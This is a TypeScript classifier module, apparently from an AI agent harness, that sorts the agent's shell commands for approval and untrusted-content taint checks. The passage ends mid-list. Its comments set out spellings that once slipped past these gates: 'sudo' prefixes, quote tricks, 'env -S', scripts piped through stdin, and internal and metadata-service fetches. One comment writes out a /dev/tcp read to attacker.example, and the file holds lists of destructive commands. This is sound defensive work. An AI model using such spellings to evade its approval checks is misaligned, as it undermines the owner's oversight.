/**
 * What a command is, read off the invocation: what it runs, where it writes, what it reaches, and
 * whether what came back is the owner's own bytes or somebody else's.
 *
 * Lifted out of tools.ts unchanged. Every classifier here answers a question about one `shell`
 * call - or about a script that call hands to an interpreter - and the whole point of keeping them
 * in one file is that they must agree with each other: `commandScript` is the single reader of
 * where a script was written down, and a classifier that reads `args` alone instead is exactly how
 * `stdin` walked past all of them at once.
 *
 * `tools.ts` re-exports what it always exported, so no caller moved.
 *
 * The download-quarantine trio sits here rather than with the write classifiers because
 * `untrustedShellOrigin` reads it: a `cat workspace/downloads/terms.txt` is a tainted read, and
 * putting the predicate in write-classification.ts - which already imports this module for
 * `gitSubcommand` and the package-manager sets - would close a cycle between the two.
 */
import { posix } from 'node:path';
import { isIP } from 'node:net';
import { reachOfBindAddress, type NetworkReach } from '@athanor/core';
import { classifyDestination } from './egress.js';
import { textValue } from './values.js';

/**
 * Whether the bytes an address hands back were written on somebody else's computer.
 *
 * The PROVENANCE question, and deliberately not the egress question `classifyDestination` answers.
 * The two were the same call here and that is what broke: this asked `classifyDestination(...).sink`,
 * which is `isPublicHttpUrl`, which is false for loopback and equally false for all of RFC1918,
 * link-local, `*.local`, `*.internal`, `*.home.arpa` and `metadata.google.internal`. So
 * `curl -s http://wiki.internal/runbook` and `curl -s http://169.254.169.254/latest/meta-data/`
 * came back clean: a page off the estate LAN and the cloud metadata service are both somebody
 * else's bytes, and a turn that read them went on to write the brief, nominate memory and fetch
 * outward with the floor still reporting it clean. Measured against `fb93b40` on nine such
 * addresses: all nine tainted there, none tainted here, and in BOTH spellings - so the "the silent
 * spelling was already free" bound that covers the rest of this change did not cover this clause.
 *
 * The two questions differ because they are asked in opposite directions. Somewhere data cannot go
 * is a large set, and being generous with it loses nothing. Somewhere trustworthy bytes come FROM
 * is a tiny set - this process's own output - and being generous with it is the entire hole. So
 * this recognises loopback and nothing else: a spelling it fails to recognise taints, which costs
 * a card rather than losing one. That inversion is why the arithmetic is written here instead of
 * deferred to core's single list; the argument for one list is an argument about a check that
 * fails open, and this one fails closed.
 *
 * What it keeps is the reason a destination test was wanted at all. A health check against the dev
 * server this turn just started reads this computer's own output, and calling that hostile marked
 * the rest of the turn on the strength of the harness's own bytes. `http://localhost:5173/api/health`
 * and `http://127.0.0.1:8080/` stay clean, and the owner's one-shot scenario ends on exactly that
 * call. Measured: narrowing this from the private ranges to loopback moves no card in any mode on
 * any of the fourteen scenarios - the turn is already tainted by `npm install` long before the
 * health check, so the private ranges were never buying a card, only losing stops.
 *
 * No self-origin argument, because no caller has one: the taint reader is handed `args` and
 * nothing else. A read of this box's own published preview therefore taints, which is the
 * direction to be wrong in.
 */
const readsAnotherComputer = (address: string): boolean => {
  let host: string;
  try {
    const url = new URL(address);
    // A scheme this cannot reason about is not a cleared one. `commandAddresses` fills in https for
    // the bare authorities it reads, so anything else here came from the command text.
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return true;
    host = url.hostname.toLowerCase().replace(/^\[|\]$/g, '');
  } catch {
    /*
     * Unreadable fails closed, and `curl -s "$U"` is the case that relies on it: `commandAddresses`
     * hands back the operand it could not read, and an operand nobody can resolve is not a cleared
     * address. This is the one behaviour the old spelling got right for the right reason.
     */
    return true;
  }
  // The DNS root label, normalised for the reason `classifyDestination` normalises it: two
  // spellings reach one host, and `localhost.` resolves to 127.0.0.1 on this box.
  if (host.length > 1 && host.endsWith('.')) host = host.slice(0, -1);
  if (host === 'localhost' || host.endsWith('.localhost')) return false;
  // 127.0.0.0/8 entire, not 127.0.0.1 alone: a resolver stub on 127.0.0.53 is still this computer.
  // The IPv4-mapped spelling is unwrapped first so `::ffff:127.0.0.1` cannot walk past the test.
  const mapped = host.startsWith('::ffff:') ? host.slice(7) : host;
  if (/^127(?:\.\d{1,3}){3}$/.test(mapped)) return false;
  return host !== '::1';
};
/**
 * Segments of a script that open no socket, whatever else they do.
 *
 * The autonomous network allowlist asks whether a command is a known-safe network client, and it
 * asked it of every segment - so `cd`, `set`, `mkdir`, `tee`, `export` and `test` each raised
 * "Review network access for cd" while `curl -sS https://example.com -o data.json` was free.
 * Measured on this tree before the repair: nine of fourteen idiomatic install lines carded on a
 * clean turn, and the one line that actually fetched from an unnamed host did not. Backwards on
 * blast radius, and `cd` reaches nothing at all.
 *
 * Deliberately NOT a reuse of `READ_ONLY_EXECUTABLES`, whose own comment says it is not a security
 * boundary. Here it would be one: a name wrongly on this list is a network card that stops firing.
 * So it is small, it is shell builtins and the coreutils that take a path only to stat, create or
 * print it, and every member is a program with no socket in it.
 *
 * `cat` is deliberately absent and it is the interesting exclusion. bash needs no program on the
 * box to open a socket - `cat < /dev/tcp/attacker.example/80` is the shell connecting and handing
 * `cat` the far end - and `devSocketAddresses` reports that address against a segment whose
 * executable is `cat`. A `cat` on this list would make that read free.
 *
 * `tee` is here and the asymmetry is the point. `/dev/tcp` is bash redirection syntax and not a
 * file: there is no such path on Linux, so `tee /dev/tcp/host/443` fails rather than connecting,
 * and the only route to a socket through `tee` is a redirection the shell performs - which
 * `devSocketAddresses` reads out of the command text, and whose write-only spelling `DEV_SOCKET_READ`
 * already declines to treat as a read. What `tee` really is here is
 * `curl -sS https://x -o - | tee data.json`, and that carded.
 */
export const noEgressExecutables = new Set([
  ':',
  '[',
  'cd',
  'echo',
  'export',
  'false',
  'mkdir',
  'printf',
  'pwd',
  'set',
  'tee',
  'test',
  'true',
  'umask',
  'unset'
]);

export const FILE_WRITING_EXECUTABLES = new Set([
  'chmod',
  'chown',
  'cp',
  'install',
  'ln',
  'mkdir',
  'mv',
  'patch',
  'rename',
  'rsync',
  'tar',
  'tee',
  'touch',
  'unzip'
]);

export const WRITING_GIT_SUBCOMMANDS = new Set([
  'add',
  'am',
  'apply',
  'checkout',
  'cherry-pick',
  'clean',
  'commit',
  'init',
  'merge',
  'mv',
  'push',
  'rebase',
  'reset',
  'restore',
  'revert',
  'rm',
  'stash',
  'switch',
  'tag',
  /*
   * `git worktree add` creates a second checkout and `git worktree remove --force` deletes one
   * along with whatever was uncommitted in it, and neither was scored as a change - so
   * `writtenPaths` named no path for either and every rule downstream of it was answering about a
   * command it thought had written nothing.
   *
   * A reading `git worktree list` is scored a write by this set too, because a set of subcommands
   * cannot see its own operands. That costs the completion rule one extra check and raises no card,
   * which is the asymmetry write-classification.ts states in its own words: a command wrongly
   * called a change costs a second check, and a change wrongly called a check cannot be recovered
   * from.
   */
  'worktree'
]);

export const consequentialExecutables = new Set([
  'rm',
  'rmdir',
  'unlink',
  'shred',
  'truncate',
  'shutdown',
  'reboot',
  'poweroff',
  'halt',
  'dd',
  'wipefs'
]);

/**
 * Signalling a process, which is not destroying data and used to be filed as though it were.
 *
 * `kill`, `killall` and `pkill` sat in the set above beside `rm` and `dd`. Measured through the
 * shipped `approvalRequirement` at bfbbd00, `kill -0 1234` - a liveness probe that sends no signal
 * at all - `pkill -f vite` and `killall node` each stopped the turn in ALL THREE modes under a
 * preview reading "This can remove or overwrite data", which is false of every one of them.
 * Stopping the dev server this agent started two calls earlier is ordinary work, and a card in
 * front of ordinary work is a card the owner learns to tap through.
 *
 * They are named here rather than simply deleted, because `placeableExecutable` is the list of
 * words this file can NAME and the publish walk reads straight past a word it cannot place:
 * dropping the three outright would have made `pkill -f "npm publish"` read on to `npm`.
 *
 * What signalling can still do to this computer is held by `signalStopsThisComputer` below instead,
 * because it is a property of the target and not of the program.
 */
export const SIGNALLING_EXECUTABLES = new Set(['kill', 'killall', 'pkill']);

/**
 * A signal whose target is the computer rather than a process on it.
 *
 * PID 1 is the init process: signalling it ends every process on this machine, the turn asking the
 * question included, and nothing here brings it back - which is the `shutdown` family's card
 * arriving by another spelling. `-1` is the other target that means everything, since to `kill` it
 * is every process the caller may signal.
 *
 * ONE token is dropped, and only when it begins with a dash, so `kill -9 1` stops and `kill -1 1234`
 * - SIGHUP to one process - does not. It does not parse `-s`, and the consequence is worth saying
 * in both directions rather than only the flattering one: the VALUE of a `-s` stays in the target
 * list, so `kill -s SIGKILL 1` is still caught by the `1` after it, and `kill -s 1 1234` - SIGHUP
 * by number to one ordinary process - is carded when it should not be. That last one is a card
 * nobody needs and it was carded before this function existed too, so it costs nothing new; the
 * alternative, teaching this the option grammar of every `kill` on every platform, buys one card
 * back and risks reading a target as a signal, which frees the one act this exists to stop.
 *
 * A PID arriving through a substitution is not read at all, and `killall`/`pkill` are not asked,
 * since neither names PID 1 by number. Both land on the no-card path, which is where a signal to an
 * ordinary process belongs, and both are a walk-past a determined caller can take.
 */
export const signalStopsThisComputer = (
  executable: string,
  commandArgs: readonly string[]
): boolean =>
  executable === 'kill' &&
  commandArgs
    .slice(commandArgs[0]?.startsWith('-') ? 1 : 0)
    .some((argument) => argument === '1' || argument === '-1');
/**
 * Commands whose whole job is to run another command. What they run is what matters; the wrapper
 * itself changes nothing.
 *
 * `npx` and `bunx` are the two entries the sentence above is not strictly true of, and they are
 * here anyway because leaving them out was measured costing a card the floor is built on:
 * `npx npm publish` and `bunx npm publish` raised NOTHING in balanced or autonomous while the bare
 * `npm publish` beside them raised `external_consequential` in all three. Every reader in this file
 * saw the executable `npx`, which is on no list, and stopped. `pnpm dlx npm publish` and
 * `yarn dlx npm publish` carded only by accident - `pnpm` and `yarn` are themselves in the publish
 * table and the scan finds `publish` as a word anywhere in the run - so the hole was one spelling
 * wide and invisible from the two that happened to close.
 *
 * What they change that the others do not is that they FETCH: `npx x` downloads `x` from a registry
 * and runs it, which is third-party code execution and is a bigger act than anything it wraps.
 * Stripping them here does not judge that act and does not claim to - it only stops the wrapper
 * hiding the wrapped command from every gate below. The fetch itself is carded by nothing today,
 * before this change or after, and `docs/design/floor/PUBLISH.md` records it as open rather than
 * letting this comment imply it is covered.
 *
 * Strictly monotonic: nothing in this repository keys on the executable `npx` or `bunx`, so no call
 * that cards today stops carding, and the wrapped command becomes visible to the destructive,
 * publish, install, push and upload readers alike.
 *
 * `sudo` and the rest of the escalation family are here for the opposite reason to `npx`, and they
 * are the reason this set was widened. A card keyed on the head of a command is switched off by
 * putting one word in front of it, and measured on this tree before the change, in balanced AND
 * autonomous: `sudo npm publish`, `sudo docker push me/img`, `sudo git push origin main`,
 * `sudo apt-get install nginx` and `sudo rm -rf /etc/nginx` ALL raised nothing, while every bare
 * form beside them raised a card. `doas`, `pkexec`, `runuser`, `command` and `builtin` are the same
 * shape. Nothing in this repository keys on any of these names, so stripping them removes no card;
 * `subscription-agent.ts` denies `sudo *` to a packaged client through its own deny-list, which is
 * a different reader and is unaffected.
 *
 * A list of wrappers can never be complete - a shell function, an alias and a script on PATH are
 * all unreadable from the command text - so this set is the cheap half of the repair and not the
 * bound. The bound is `publishingOperation` at the foot of this file, which keeps reading past any
 * word it cannot name.
 */
export const COMMAND_RUNNERS = new Set([
  'arch',
  'builtin',
  'bunx',
  // `busybox tee f` runs the applet named after it, so the applet is the command.
  'busybox',
  'caffeinate',
  'catchsegv',
  'chronic',
  'chrt',
  'command',
  'corepack',
  'doas',
  'env',
  'eval',
  'flock',
  'gtimeout',
  'ionice',
  'ltrace',
  'nice',
  'nohup',
  'npx',
  'pkexec',
  'proxychains',
  'proxychains4',
  'retry',
  'runuser',
  'setarch',
  'setsid',
  'stdbuf',
  'strace',
  'sudo',
  'taskset',
  'time',
  'timeout',
  'unbuffer',
  'watch',
  'xargs'
]);

/**
 * A wrapper whose name is two words, and the second word is what makes it one.
 *
 * `poetry run npm publish` and `poetry publish` share a head, so a set of bare names cannot hold
 * both: stripping `poetry` would hide the operation this file exists to see. Keyed on the pair
 * instead, so only the `run`/`exec`/`dlx` spelling comes off and the publishing subcommand of the
 * same tool is untouched.
 */
const RUNNER_SUBCOMMANDS = new Map<string, ReadonlySet<string>>([
  ['asdf', new Set(['exec'])],
  ['bun', new Set(['x'])],
  ['bundle', new Set(['exec'])],
  ['conda', new Set(['run'])],
  ['direnv', new Set(['exec'])],
  ['hatch', new Set(['run'])],
  ['mise', new Set(['exec'])],
  ['nodenv', new Set(['exec'])],
  ['npm', new Set(['exec'])],
  ['pdm', new Set(['run'])],
  ['pipenv', new Set(['run'])],
  ['pnpm', new Set(['dlx', 'exec'])],
  ['poetry', new Set(['run'])],
  ['pyenv', new Set(['exec'])],
  ['rbenv', new Set(['exec'])],
  ['rye', new Set(['run'])],
  ['uv', new Set(['run'])],
  ['yarn', new Set(['dlx', 'exec'])]
]);

/**
 * The runner's own options that carry their value in the NEXT token, and the positional arguments
 * that belong to the runner rather than to what it wraps.
 *
 * Both tables exist because the shipped heuristic - "the wrapped command is the first token that is
 * not a flag, not an assignment and not a number" - is wrong on exactly these two shapes, and both
 * were measured defeating the publish card: `sudo -u root npm publish` read `root` as the command,
 * `xargs -I {} npm publish` read `{}`, and `flock /tmp/lock docker push me/img` read the lock file.
 * All three raised nothing outside review.
 *
 * `-c`/`--command` is deliberately absent from every value list. `su -c 'npm publish'` and
 * `runuser -u x -c 'npm publish'` put the command in a quoted string, and leaving `-c` to be
 * skipped as a plain flag lets the head land on the string's first word - which `unquoted` then
 * makes readable. Naming it as a value option would swallow the command instead.
 */
const RUNNER_VALUE_OPTIONS = new Map<string, ReadonlySet<string>>([
  // `command -v vercel` and `command -V vercel` PRINT where vercel is and run nothing at all, and
  // it is how every setup script asks whether a tool is installed. Stripping `command` and then
  // reading the name after the flag turned that read into "Publish online with vercel" in all three
  // modes - a consequential card, on a command that opens no socket. Naming the two options as
  // carrying a value is the true statement: what follows them is a name to look up, not a command.
  ['command', new Set(['-v', '-V'])],
  ['conda run', new Set(['-n', '--name', '-p', '--prefix'])],
  /*
   * The container and pod runners, read by `commandCarriedIntoAnotherBox` below rather than by
   * `withoutRunners`. They are NOT in `RUNNER_SUBCOMMANDS`, and the difference is the whole care:
   * stripping `docker exec pg` outright would hand every reader here the inner command with this
   * machine's working directory attached, and `docker exec pg rm -rf dist` would then resolve
   * `dist` to `workspace/dist` and be FREED by the location rule for a delete inside a container
   * that no checkpoint on this computer walks.
   */
  ['docker compose exec', new Set(['-e', '--env', '-u', '--user', '-w', '--workdir', '--index'])],
  [
    'docker exec',
    new Set(['-e', '--env', '-u', '--user', '-w', '--workdir', '--env-file', '--detach-keys'])
  ],
  ['docker-compose exec', new Set(['-e', '--env', '-u', '--user', '-w', '--workdir', '--index'])],
  [
    'kubectl exec',
    new Set([
      '-c',
      '--container',
      '-n',
      '--namespace',
      '--context',
      '--kubeconfig',
      '--pod-running-timeout',
      '--request-timeout'
    ])
  ],
  ['podman compose exec', new Set(['-e', '--env', '-u', '--user', '-w', '--workdir'])],
  [
    'podman exec',
    new Set(['-e', '--env', '-u', '--user', '-w', '--workdir', '--env-file', '--detach-keys'])
  ],
  ['env', new Set(['-u', '--unset', '-C', '--chdir'])],
  ['flock', new Set(['-w', '--wait', '--timeout', '-E', '--conflict-exit-code'])],
  ['ionice', new Set(['-c', '-n', '-p', '-P', '-u', '--class', '--classdata', '--pid'])],
  ['ltrace', new Set(['-e', '-o', '-p', '-s'])],
  ['nice', new Set(['-n', '--adjustment'])],
  ['pkexec', new Set(['--user'])],
  ['proxychains', new Set(['-f'])],
  ['proxychains4', new Set(['-f'])],
  ['runuser', new Set(['-u', '--user', '-g', '--group', '-G', '--supp-group', '-s', '--shell'])],
  ['stdbuf', new Set(['-i', '-o', '-e', '--input', '--output', '--error'])],
  ['strace', new Set(['-e', '-o', '-p', '-s', '-E'])],
  [
    'sudo',
    new Set([
      '-u',
      '--user',
      '-g',
      '--group',
      '-h',
      '--host',
      '-p',
      '--prompt',
      '-r',
      '--role',
      '-t',
      '--type',
      '-C',
      '--close-from',
      '-D',
      '--chdir',
      '-R',
      '--chroot',
      '-T',
      '--command-timeout',
      '-U',
      '--other-user'
    ])
  ],
  ['taskset', new Set(['-p', '--pid'])],
  ['timeout', new Set(['-s', '--signal', '-k', '--kill-after'])],
  ['gtimeout', new Set(['-s', '--signal', '-k', '--kill-after'])],
  ['watch', new Set(['-n', '--interval', '-d'])],
  ['xargs', new Set(['-I', '-i', '-L', '-a', '-d', '-E', '--arg-file', '--delimiter', '--replace'])]
]);

/**
 * The runner options whose value is the COMMAND rather than a setting for it.
 *
 * `env -S 'npm publish'` and `env --split-string='npm publish'` are one option away from
 * `sh -c 'npm publish'`, and this wave's own repair opened them: naming `-S` a value option made
 * the runner swallow the command, exactly as the note above says naming `-c` would. Both spellings
 * raised NOTHING outside review while `env -u X npm publish` beside them carded.
 *
 * The value is split on whitespace because that is what the option means - it is the shell's word
 * splitting, handed to `env` - so the command inside it becomes tokens every table here can read.
 * `-c` is still deliberately absent from every table: an interpreter's script is read by
 * `commandScript`, which is a whole reader rather than one option, and this is only for the
 * runners that have no such reader.
 */
const RUNNER_SCRIPT_OPTIONS = new Map<string, ReadonlySet<string>>([
  ['env', new Set(['-s', '--split-string'])]
]);

/**
 * Positional tokens the runner takes for itself, consumed BEFORE the "not a number" rule rather
 * than after it. `flock 3 npm publish` locks file descriptor 3, so the digit rule would skip the
 * lock and then read `npm` as the runner's own argument; consuming the declared positional first
 * gets both spellings right, and `timeout 30 npm publish` - which declares none - still reaches the
 * digit rule that was written for it.
 */
const RUNNER_POSITIONALS = new Map<string, number>([
  ['direnv exec', 1],
  // The container, the compose service and the pod: one operand each, and the command begins after
  // it. `kubectl exec pod -- psql …` reaches the same answer through the `--` rule instead.
  ['docker compose exec', 1],
  ['docker exec', 1],
  ['docker-compose exec', 1],
  ['flock', 1],
  ['kubectl exec', 1],
  ['podman compose exec', 1],
  ['podman exec', 1],
  ['setarch', 1]
]);

/**
 * A token with the shell's quoting taken off, for the places where a quote can only be noise.
 *
 * `"npm" publish` and `eval "npm publish"` were two of the six one-word bypasses: nothing here
 * splits a script the way a shell does, so a quoted word arrives with its quotes attached and
 * matches no table.
 *
 * EVERY quote, not the ones at the ends. Stripping the two ends independently reads `"npm" publish`
 * and stops dead at the spelling one character along, and the shell does not care where the quote
 * sits: `n"p"m publish`, `np''m publish`, `"n"pm publish` and `n\pm publish` all run npm, and all
 * four raised NOTHING outside review on this tree - measured beside `"npm" publish`, which carded.
 * The same held for `v"e"rcel --prod` and `kube"ctl" apply -f k8s.yaml`. A repair that only reaches
 * the spelling it was written against is the shape this file exists to stop having.
 *
 * Only ever applied to a token being matched against a table of program, subcommand and operation
 * names, or to the tokens of a nested script that the shell would itself have unquoted before
 * running - and no program, subcommand or operation this file names can contain a quote or a
 * backslash, so nothing legitimate is lost.
 */
const unquoted = (token: string): string =>
  // `$'npm'` is bash's ANSI-C quoting and `$"npm"` its locale form; both run npm, and a dollar left
  // in front of the word matches no table. Only a dollar that IMMEDIATELY precedes a quote comes
  // off, so `curl -s "$U"` still reaches the readers below as `$U` - an operand nobody can resolve,
  // which is what the taint rule needs it to stay.
  token.replace(/\$(?=['"])/g, '').replace(/['"\\]/g, '');

/**
 * The words a shell puts in front of a command without being one. `if grep -q x f; then cp a b; fi`
 * runs grep and then cp, and every classifier here that read the first word of the segment read
 * `if` and `then` instead - an unknown executable, twice, in a shape the model writes constantly.
 * Stripped in the same pass as the runners because they are the same fact: the token that matters
 * is the next one. The terminators are not here, because nothing follows them to be judged; they
 * are inert commands and are named as such in READ_ONLY_EXECUTABLES.
 */
const SHELL_KEYWORDS = new Set(['!', 'do', 'elif', 'else', 'exec', 'if', 'then', 'until', 'while']);

/**
 * One invocation with its wrappers taken off: leading `FOO=1` assignments, the command runners, and
 * the shell keywords, repeatedly until the head is the thing that actually runs.
 *
 * Extracted from `effectiveCommands` so `scriptCommands` can use it too, which is the whole repair:
 * the outer form `timeout 30 curl -s "$U"` was unwrapped and the identical script inside
 * `bash -lc 'timeout 30 curl -s "$U"'` was not, so the first tainted the turn and the second - the
 * spelling the shell tool's own description tells the model to reach for - read an attacker-chosen
 * page with the floor still reporting the turn clean. Measured before the fix on `timeout`, `env`
 * and `xargs`; all three were clean.
 *
 * The runner's own arguments are read from `RUNNER_VALUE_OPTIONS` and `RUNNER_POSITIONALS` rather
 * than guessed at, and `--` ends them outright wherever it appears, because the guess was wrong on
 * every shape that carries a name: `sudo -u root`, `xargs -I {}`, `flock /tmp/lock`,
 * `runuser -u deploy --`.
 */
const runnerBody = (runner: string, after: readonly string[]): string[] => {
  const valueOptions = RUNNER_VALUE_OPTIONS.get(runner);
  let positionals = RUNNER_POSITIONALS.get(runner) ?? 0;
  const scriptOptions = RUNNER_SCRIPT_OPTIONS.get(runner);
  const split = (value: string): string[] => value.split(/\s+/).filter(Boolean);
  for (const [index, token = ''] of after.entries()) {
    // Everything before `--` is the runner's; everything after it is the command, whatever it looks
    // like. This is the only spelling in which a command may legitimately begin with a dash.
    if (token === '--') return [...after.slice(index + 1)];
    if (scriptOptions) {
      /*
       * `-S` before its value, and `--split-string=` carrying it. Case-folded on the option only:
       * `env -S` and `env -s` are the same option and the value is left exactly as written.
       *
       * AND EVERYTHING AFTER IT, which is the half the repair was missing. The option's value is
       * one shell word, and a shell word containing a space arrives here as several tokens whenever
       * the call was written as a script rather than as an argument array: `env -S 'npm publish'`
       * inside `bash -lc` is `-S`, `'npm`, `publish'`. Taking only `after[index + 1]` read the
       * value as `npm` with no operation after it, so the row that proved this repair - which used
       * the array spelling, where the value really is one token - passed while the spelling the
       * shell tool's own description tells the model to write raised nothing at all in balanced or
       * autonomous. Measured on this tree before this line: `env -S 'npm publish'` and
       * `env --split-string='npm publish'` free, `{ executable: 'env', args: ['-S', 'npm publish'] }`
       * carding beside them. The rest of the tokens are appended in both spellings; nothing else
       * can follow the value, because `-S` consumes the remainder of the command line by
       * definition.
       */
      const separator = token.indexOf('=');
      if (separator > 0 && scriptOptions.has(token.slice(0, separator).toLowerCase()))
        return [...split(token.slice(separator + 1)), ...after.slice(index + 1)];
      if (scriptOptions.has(token.toLowerCase()))
        return [...split(after[index + 1] ?? ''), ...after.slice(index + 2)];
    }
    if (token.startsWith('-')) continue;
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(token)) continue;
    if (index > 0 && valueOptions?.has(after[index - 1] ?? '')) continue;
    if (positionals > 0) {
      positionals -= 1;
      continue;
    }
    if (/^\d/.test(token)) continue;
    return [...after.slice(index)];
  }
  return [];
};

const withoutRunners = (tokens: readonly string[]): string[] => {
  let rest = [...tokens];
  // Each pass drops at least one token, so this terminates on any input, and an empty list returns
  // on the first check.
  for (;;) {
    const word = unquoted(rest[0] ?? '');
    const head = (word.split('/').pop() ?? '').toLowerCase();
    // The assignment is tested on the whole word and not on its last path element, because the
    // value of one is very often a path: `PATH=/usr/local/bin:$PATH curl …` and
    // `https_proxy=http://x:3128 pip …` are both assignments, and read after the split on `/`
    // they are a command called `bin:$PATH` and one called `x:3128` - each of which names a
    // program no reader here has a table for, in front of the real one.
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(word) || SHELL_KEYWORDS.has(head)) {
      rest = rest.slice(1);
      continue;
    }
    const subcommand = unquoted(rest[1] ?? '').toLowerCase();
    if (RUNNER_SUBCOMMANDS.get(head)?.has(subcommand)) {
      rest = runnerBody(`${head} ${subcommand}`, rest.slice(2));
      continue;
    }
    if (!COMMAND_RUNNERS.has(head)) return rest;
    rest = runnerBody(head, rest.slice(1));
  }
};

export const shellInterpreters = new Set(['sh', 'bash', 'dash', 'zsh']);
export const commandInterpreters = new Set([
  ...shellInterpreters,
  'python',
  'python3',
  'node',
  'perl',
  'ruby'
]);

/**
 * The flag that says "the next argument is the script", in every spelling a shell or a runtime
 * accepts it in.
 *
 * A cluster of short flags is one argument, and the script flag is read wherever it sits in the
 * cluster rather than only when it stands alone: `bash -ec '…'`, `sh -euc '…'`, `bash -xc '…'` and
 * `perl -pe '…'` all hand the next argument over exactly as `-c` and `-e` do. While this was a
 * list of four spellings, the cluster forms read as a file to run - so the script was '' and
 * every classifier that reads it, the write floor and the destination readers included, saw an
 * interpreter running nothing. Measured through the shell arm before this line: a reader shown
 * fifty lines of a file ran `bash -ec 'echo x > app.ts'` and the file was one line afterwards.
 */
const isInlineScriptFlag = (token: string): boolean =>
  token === '--eval' || /^-[A-Za-z]*[ce]$/.test(token);

/** The script text an interpreter was handed inline, or '' when it was given a file to run. */
export const inlineScriptBody = (args: readonly string[]): string =>
  args
    .flatMap((argument, index) => {
      if (isInlineScriptFlag(argument)) return [args[index + 1] ?? ''];
      const separator = argument.indexOf('=');
      return separator > 0 && isInlineScriptFlag(argument.slice(0, separator))
        ? [argument.slice(separator + 1)]
        : [];
    })
    .join('\n');

/**
 * Everything the command will actually execute, wherever it was written down.
 *
 * `shell` accepts a `stdin` string, and an interpreter reads a script from it exactly as it reads
 * one from `-c`. Every classifier here - the destinations it may reach, the paths it writes, whether
 * it is destructive, whether it came from untrusted content - read only `executable` and `args`, so
 * moving the script into `stdin` walked past all of them at once. It appeared once in this file, in
 * the schema that declares it, and nowhere else.
 */
export const commandScript = (args: Record<string, unknown>): string => {
  const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
  /*
   * The inline flags are read only when the program they are handed to is an interpreter. `-c`
   * and `-e` mean something on most programs - `grep -c` counts, `grep -e` is a pattern - and
   * reading every `-e` value as a script made `grep -rn -e '> app.ts' .` a script containing a
   * redirect, which the write floor then refused as a whole-file write. The wrappers come off
   * first, so `env -S`, `sudo` and `timeout` in front of the interpreter do not hide it. Stdin is
   * read for every program: a script arrives there whatever the executable is called.
   */
  const tokens = withoutRunners([textValue(args.executable), ...commandArgs]);
  const head = (
    unquoted(tokens[0] ?? '')
      .split('/')
      .pop() ?? ''
  ).toLowerCase();
  const inline = commandInterpreters.has(head) ? inlineScriptBody(tokens.slice(1)) : '';
  return [inline, textValue(args.stdin)].filter(Boolean).join('\n');
};

/**
 * A redirection whose target leaves the workspace: absolute, home-relative, or climbing out with
 * `..`. `2>&1`, `->` and a plain `>` comparison are all excluded by construction, since none of
 * them is followed by a path shaped like one of those three.
 *
 * The discard sinks and the scratch directories are not escapes. `>/dev/null` is how every noisy
 * converter on this computer is silenced, and it removes nothing - but it is an absolute path, so
 * it stopped the task and asked the owner to approve a command that could not destroy anything.
 * That was very likely a larger share of the interruptions than any real delete.
 */
const HARMLESS_REDIRECT_TARGET = /^(?:\/dev\/(?:null|stdout|stderr|zero|tty)|\/(?:var\/)?tmp\/)/;
const escapingRedirect = (body: string): boolean => {
  // Quoted program text has no shell redirects. Command substitutions still execute inside
  // double quotes, so their own quote scope must be inspected independently.
  let quote = '';
  const substitutions: Array<{ quote: string; depth: number; backtick: boolean }> = [];
  for (let i = 0; i < body.length; i++) {
    const character = body[i];
    if (character === '\\' && quote !== "'") {
      i++;
      continue;
    }
    if (quote === "'") {
      if (character === "'") quote = '';
      continue;
    }
    if (character === '$' && body[i + 1] === '(') {
      substitutions.push({ quote, depth: 1, backtick: false });
      quote = '';
      i++;
      continue;
    }
    if (character === '`') {
      const current = substitutions.at(-1);
      if (current?.backtick) {
        quote = current.quote;
        substitutions.pop();
      } else {
        substitutions.push({ quote, depth: 0, backtick: true });
        quote = '';
      }
      continue;
    }
    if (quote === '"') {
      if (character === '"') quote = '';
      continue;
    }
    if (character === "'" || character === '"') {
      quote = character;
      continue;
    }
    const current = substitutions.at(-1);
    if (current && !current.backtick) {
      if (character === '(') current.depth++;
      if (character === ')' && --current.depth === 0) {
        quote = current.quote;
        substitutions.pop();
      }
    }
    if (character !== '>' || /[->\d]/.test(body[i - 1] ?? '')) continue;
    const match = /^>>?\s*['"]?((?:\/|~\/|\.\.\/)[^\s'";|&)]*)/.exec(body.slice(i));
    if (match && !HARMLESS_REDIRECT_TARGET.test(match[1] ?? '')) return true;
  }
  return false;
};

/**
 * Whether an inline script is destructive, rather than merely inline.
 *
 * `shell` performs no expansion, so an interpreter is the only way to pipe, glob or redirect - and
 * the built-in procedures use one constantly: reading a zip's table of contents, counting PDF
 * pages, listing installed fonts. Classifying every `-c` as destructive put a card reading "this
 * can remove or overwrite data" in front of each of those, and an owner who taps through five
 * wrong warnings taps through the sixth one that matters. So the body is scanned for the same
 * things that would escalate a bare command, plus the language-level equivalents an interpreter
 * makes reachable. Writing the identical script to a file and running it stays unescalated, which
 * is the honest reading of the rule rather than a hole in it: neither is destructive by itself.
 */
/**
 * A delete written through a language runtime, whoever the receiver happens to be called.
 *
 * This used to require the literal text `fs.`, so `require('fs').rmSync('/home/athanor')` and the
 * same call through any local name went through with no card at all - while `rm -f` on the
 * workspace's own scratch directory stopped the task. The control refused the honest phrasing and
 * missed the evasive one. Matching the method rather than the receiver closes that, and these
 * names are specific enough not to catch ordinary code: `remove` on its own is not among them,
 * because every list in every language has one.
 */
const DESTRUCTIVE_RUNTIME_CALL =
  /\.(?:rm|rmSync|rmdir|rmdirSync|unlink|unlinkSync|rmtree|removedirs)\s*\(/;

export const isDestructiveScript = (body: string, interpreter = 'sh'): boolean =>
  new RegExp(
    `(?<![\\w.])(?:${[...consequentialExecutables].join('|')}|mkfs[\\w.-]*|shutil\\.rmtree|os\\.(?:remove|removedirs|rmdir|unlink))(?![\\w])`
  ).test(body) ||
  DESTRUCTIVE_RUNTIME_CALL.test(body) ||
  /*
   * The one destruction in here that no name in the scan above spells. Every other member is a
   * program whose name says what it does; `git worktree remove --force ../wt` is spelled with
   * `git`, which is in `safeNetworkExecutables` and in nothing destructive. Read from the
   * decomposed commands rather than from a pattern over the body, so `git worktree list` and the
   * word `remove` in a commit message are not it.
   */
  scriptCommands(body).some(
    ([head = '', ...rest]) =>
      (unquoted(head).split('/').pop() ?? '').toLowerCase() === 'git' && gitRemovesAWorktree(rest)
  ) ||
  (shellInterpreters.has(interpreter) && escapingRedirect(body));
export const safeNetworkExecutables = new Set([
  'apt',
  'apt-get',
  'brew',
  'cargo',
  'curl',
  'dig',
  'dnf',
  'git',
  'go',
  'host',
  'npm',
